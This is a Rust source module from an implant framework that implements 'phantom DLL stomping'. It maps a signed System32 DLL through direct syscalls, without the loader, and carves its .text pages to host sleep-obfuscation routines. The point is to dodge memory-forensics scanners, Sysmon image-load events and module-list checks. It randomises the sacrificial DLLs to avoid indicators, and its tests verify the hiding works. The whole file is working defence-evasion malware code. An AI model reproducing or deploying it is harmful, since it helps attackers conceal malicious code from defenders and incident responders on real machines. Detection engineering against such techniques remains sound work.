//! Phantom DLL stomping (ABR-T012): an image-backed home for the
//! hand-assembled ekko routines.
//!
//! The classic memory-forensics tripwire is a `MEM_PRIVATE` executable
//! region; every scanner in the pe-sieve/MonetaBay lineage flags it, and
//! ABR-T008 only made such a region LEGIBLE, not invisible. This module
//! instead maps a legitimately signed, mundane DLL from System32 as an
//! image section — through direct syscalls, without the loader, so no
//! PEB module-list entry and no Image Load (Sysmon EID 7) event — and
//! carves code pages out of its `.text`. The ekko thunk/wait loop and
//! its ABR-T008 unwind metadata then live in a `MEM_IMAGE` region whose
//! section name is a real Microsoft DLL path.
//!
//! Trade-off (documented in `docs/detections/abr-t012.md`): the view is
//! a PHANTOM (image-backed, absent from the module list) and its bytes
//! diverge from the on-disk DLL — the two analytics that still catch it.
//! The view is process-lifetime, exactly like the ABR-T009 KnownDlls
//! mapping.

use std::ffi::c_void;

use super::syscalls;

/// Sacrificial DLLs: signed, present on every Windows 11 install, never
/// on EDR hot lists, and never imported by the implant. The ORDER IS
/// RANDOMIZED per process (fixed order was itself an IOC — the same
/// sacrificial DLL in the same position across every implant) and every
/// candidate that maps is eligible, so the carved home varies between
/// hosts and runs. Candidates whose .text is too small to host a page
/// are skipped by the size check in `map_carver`.
const CANDIDATES: &[&str] = &[
    "colorui.dll",
    "dbgcore.dll",
    "devobj.dll",
    "dhcpcmonitor.dll",
    "dbgeng.dll",
    "framedyn.dll",
    "mshtmled.dll",
    "shsetup.dll",
];

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: usize,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *const UnicodeString,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const FILE_READ_DATA: usize = 0x0001;
const FILE_EXECUTE: usize = 0x8000_0000;
const SYNCHRONIZE: usize = 0x0010_0000;
const FILE_SHARE_READ: usize = 0x1;
const FILE_SYNCHRONOUS_IO_NONALERT: usize = 0x20;
const PAGE_READONLY: usize = 0x02;
const PAGE_READWRITE: usize = 0x04;
const SEC_IMAGE: usize = 0x0100_0000;
const SECTION_MAP_ALL: usize = 0x7; // READ | WRITE | EXECUTE
const VIEW_UNMAP: usize = 2;
const PAGE_GRANULARITY: usize = 0x1000;

/// Sequential carver over the mapped view: every consumer gets its OWN
/// page from the sacrificial section (several EkkoSleep instances can
/// live in one process — the test suite alone creates them in parallel).
struct Carver {
    view: usize,
    cursor: usize,
    end: usize,
}

static CARVER: std::sync::OnceLock<std::sync::Mutex<Option<Carver>>> = std::sync::OnceLock::new();

/// A stomped code page (`len` bytes rounded up to page granularity,
/// writable at return — the caller flips it to RX like any other code
/// page). Repeated calls carve distinct pages from the same phantom
/// view. None when no candidate DLL maps or the section is exhausted;
/// callers fall back to a private allocation.
pub fn code_page(len: usize) -> Option<usize> {
    let cell = CARVER.get_or_init(|| std::sync::Mutex::new(unsafe { new_carver() }));
    let mut guard = cell.lock().ok()?;
    let need = len.div_ceil(PAGE_GRANULARITY) * PAGE_GRANULARITY;
    guard.as_mut()?.alloc(len).filter(|&page| unsafe {
        // SEC_IMAGE views deliver .text pages with the PE's own RX
        // protection regardless of the PAGE_READWRITE mapping request —
        // flip the carved span to RW (copy-on-write) before handing it
        // out, exactly like the loader does when applying relocations.
        // The consumer flips it RX after writing.
        syscalls::protect(page, need, PAGE_READWRITE).is_some()
    })
}

impl Carver {
    fn alloc(&mut self, len: usize) -> Option<usize> {
        let need = len.div_ceil(PAGE_GRANULARITY) * PAGE_GRANULARITY;
        if self.cursor + need > self.end {
            return None;
        }
        let page = self.view + self.cursor;
        self.cursor += need;
        Some(page)
    }
}

unsafe fn new_carver() -> Option<Carver> {
    // Random start offset, then wrap around the whole list: every
    // candidate gets an equal chance of being the carved home while a
    // failing map (locked, missing, section too small) just moves on.
    let start = rand::random::<usize>() % CANDIDATES.len();
    for step in 0..CANDIDATES.len() {
        let dll = CANDIDATES[(start + step) % CANDIDATES.len()];
        let path = format!("\\??\\C:\\Windows\\System32\\{dll}");
        if let Some(carver) = unsafe { map_carver(&path) } {
            return Some(carver);
        }
    }
    None
}

unsafe fn map_carver(path: &str) -> Option<Carver> {
    unsafe {
        let open = syscalls::resolve("NtOpenFile")?;
        let create = syscalls::resolve("NtCreateSection")?;
        let map = syscalls::resolve("NtMapViewOfSection")?;
        let close = syscalls::resolve("NtClose")?;

        let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
        let name = UnicodeString {
            length: ((wide.len() - 1) * 2) as u16,
            maximum_length: (wide.len() * 2) as u16,
            buffer: wide.as_ptr() as usize,
        };
        let attributes = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: &name,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        };
        let mut file: usize = 0;
        let mut iosb = [0usize; 2]; // IO_STATUS_BLOCK
        let status = syscalls::dispatch6(
            open,
            &mut file as *mut usize as usize,
            FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
            &attributes as *const ObjectAttributes as usize,
            iosb.as_mut_ptr() as usize,
            FILE_SHARE_READ,
            FILE_SYNCHRONOUS_IO_NONALERT,
        );
        if (status as u32 as i32) < 0 || file == 0 {
            return None;
        }
        // NtCreateSection: (handle*, access, objattrs, MaximumSize*,
        // PageProtection, AllocationAttributes, FileHandle) — note the
        // NT order puts the FILE HANDLE LAST, unlike the Win32
        // CreateFileMapping wrapper. Seven arguments, zero-padded
        // through the ten-argument dispatcher.
        let mut section: usize = 0;
        let status = syscalls::dispatch10(
            create,
            &mut section as *mut usize as usize,
            SECTION_MAP_ALL,
            0, // anonymous section (no object name)
            0, // MaximumSize: derived from the image
            PAGE_READONLY,
            SEC_IMAGE,
            file,
            0,
            0,
            0,
        );
        syscalls::dispatch6(close, file, 0, 0, 0, 0, 0);
        if (status as u32 as i32) < 0 || section == 0 {
            return None;
        }
        let mut view: usize = 0;
        let mut view_size: usize = 0;
        // Loader-equivalent RW mapping (copy-on-write): the image maps
        // writable so consumers can carve their code pages, then flip
        // them RX exactly like normal code pages.
        let status = syscalls::dispatch10(
            map,
            section,
            usize::MAX,
            &mut view as *mut usize as usize,
            0,
            0,
            0,
            &mut view_size as *mut usize as usize,
            VIEW_UNMAP,
            0,
            PAGE_READWRITE,
        );
        syscalls::dispatch6(close, section, 0, 0, 0, 0, 0);
        if (status as u32 as i32) < 0 || view == 0 {
            return None;
        }
        if std::ptr::read_volatile(view as *const u16) != 0x5A4D {
            return None; // not a PE
        }
        carve_span(view)
    }
}

/// Span of the largest executable section, one page past its head
/// (staying clear of the section start keeps the mapped image parseable
/// for scanners — the tampering is interior, not structural).
unsafe fn carve_span(view: usize) -> Option<Carver> {
    unsafe {
        let dos = view as *const u8;
        let read_u16 = |off: usize| view_read_u16(dos, off);
        let read_u32 = |off: usize| view_read_u32(dos, off);
        let pe = read_u32(0x3C)? as usize;
        if read_u32(pe)? != 0x0000_4550 {
            return None;
        }
        let sections = read_u16(pe + 6)? as usize;
        let optional_size = read_u16(pe + 20)? as usize;
        let table = pe + 24 + optional_size;
        const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
        let mut best: Option<(usize, usize)> = None; // (rva, size)
        for index in 0..sections {
            let header = table + index * 40;
            let virtual_size = read_u32(header + 8)? as usize;
            let virtual_address = read_u32(header + 12)? as usize;
            let characteristics = read_u32(header + 36)?;
            if characteristics & IMAGE_SCN_MEM_EXECUTE == 0 {
                continue;
            }
            if best.is_none_or(|(_, size)| virtual_size > size) {
                best = Some((virtual_address, virtual_size));
            }
        }
        let (rva, size) = best?;
        // Skip the section head; keep the tail page as slack.
        let cursor = rva + PAGE_GRANULARITY;
        let end = (rva + size) & !(PAGE_GRANULARITY - 1);
        (end > cursor + PAGE_GRANULARITY).then_some(Carver { view, cursor, end })
    }
}

unsafe fn view_read_u16(base: *const u8, off: usize) -> Option<u16> {
    unsafe {
        let p = base.add(off);
        Some(u16::from_le_bytes([
            std::ptr::read_volatile(p),
            std::ptr::read_volatile(p.add(1)),
        ]))
    }
}

unsafe fn view_read_u32(base: *const u8, off: usize) -> Option<u32> {
    unsafe {
        let p = base.add(off);
        Some(u32::from_le_bytes([
            std::ptr::read_volatile(p),
            std::ptr::read_volatile(p.add(1)),
            std::ptr::read_volatile(p.add(2)),
            std::ptr::read_volatile(p.add(3)),
        ]))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evasion::unwind;

    /// The headline property: stomped homes are image-backed, named
    /// after a legitimate DLL, absent from the module list — the exact
    /// inversion of the `MEM_PRIVATE` tripwire — and distinct per
    /// consumer.
    #[test]
    fn stomped_pages_are_image_backed_distinct_and_phantom() {
        let first = code_page(0x1000);
        let second = code_page(0x1000);
        let (Some(first), Some(second)) = (first, second) else {
            eprintln!("no sacrificial DLL mapped on this host — skipping");
            return;
        };
        assert_ne!(first, second, "carver handed out the same page twice");
        unsafe {
            // MemoryBasicInformation via the spoofed query syscall.
            let query = syscalls::resolve("NtQueryVirtualMemory").expect("query");
            #[repr(C)]
            #[allow(non_snake_case)]
            struct MemoryBasicInformation {
                BaseAddress: usize,
                AllocationBase: usize,
                AllocationProtect: u32,
                PartitionId: u16,
                _pad: u16,
                RegionSize: usize,
                State: u32,
                Protect: u32,
                Type: u32,
            }
            let mut mbi: MemoryBasicInformation = std::mem::zeroed();
            let mut needed = 0usize;
            let status = syscalls::dispatch6(
                query,
                usize::MAX,
                first,
                0,
                &mut mbi as *mut MemoryBasicInformation as usize,
                std::mem::size_of::<MemoryBasicInformation>(),
                &mut needed as *mut usize as usize,
            );
            assert!(status as u32 as i32 >= 0, "query failed");
            assert_eq!(mbi.State, 0x1000, "not committed");
            assert_eq!(mbi.Type, 0x0100_0000, "stomped page is not MEM_IMAGE");
            assert!(mbi.AllocationBase != 0 && mbi.AllocationBase <= first);

            // Section name must be the sacrificial DLL's file path.
            let mut buf = [0u8; 512];
            let status = syscalls::dispatch6(
                query,
                usize::MAX,
                first,
                2, // MemorySectionName
                buf.as_mut_ptr() as usize,
                buf.len(),
                &mut needed as *mut usize as usize,
            );
            assert!(status as u32 as i32 >= 0, "section name query failed");
            let us = &*(buf.as_ptr() as *const UnicodeString);
            let name = String::from_utf16_lossy(std::slice::from_raw_parts(
                us.buffer as *const u16,
                us.length as usize / 2,
            ));
            let lowered = name.to_lowercase();
            assert!(
                CANDIDATES.iter().any(|dll| lowered.contains(dll)),
                "unexpected section name: {name}"
            );

            // Phantom property: the view is not in the PEB module list.
            let enum_modules: unsafe extern "system" fn(
                *mut c_void,
                *mut usize,
                u32,
                *mut u32,
            ) -> i32 = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "K32EnumProcessModules").unwrap(),
            );
            let current: unsafe extern "system" fn() -> *mut c_void = std::mem::transmute(
                syscalls::export_address("kernel32.dll", "GetCurrentProcess").unwrap(),
            );
            let mut modules = [0usize; 1024];
            let mut needed = 0u32;
            let ok = enum_modules(
                current(),
                modules.as_mut_ptr(),
                (modules.len() * std::mem::size_of::<usize>()) as u32,
                &mut needed,
            );
            assert_eq!(ok, 1);
            let count = needed as usize / std::mem::size_of::<usize>();
            let view_base = mbi.AllocationBase;
            assert!(
                !modules[..count].contains(&view_base),
                "phantom view leaked into the module list"
            );
        }
    }

    /// ABR-T008 metadata registers cleanly over a stomped page — the
    /// phantom view carries no .pdata of its own, so the dynamic table is
    /// the only authority for the range.
    #[test]
    fn unwind_registers_on_stomped_page() {
        let Some(page) = code_page(0x1000) else {
            eprintln!("no sacrificial DLL mapped on this host — skipping");
            return;
        };
        let routines = [unwind::Routine {
            offset: 0,
            len: 0x20,
            prolog_end: 23,
            prolog: &[unwind::Code(23, unwind::UWOP_ALLOC_SMALL, 4)],
        }];
        // The stomped page is writable at handout; write a placeholder
        // byte pattern the table can coexist with.
        unsafe {
            let table = unwind::FunctionTable::register(page, &routines, 0x200)
                .expect("register on stomped page");
            let (image, _) = unwind::lookup(page + 1).expect("lookup on stomped page");
            assert_eq!(image, page, "lookup resolved to a foreign image");
            drop(table);
            assert!(unwind::lookup(page + 1).is_none(), "table survived Drop");
        }
    }
}
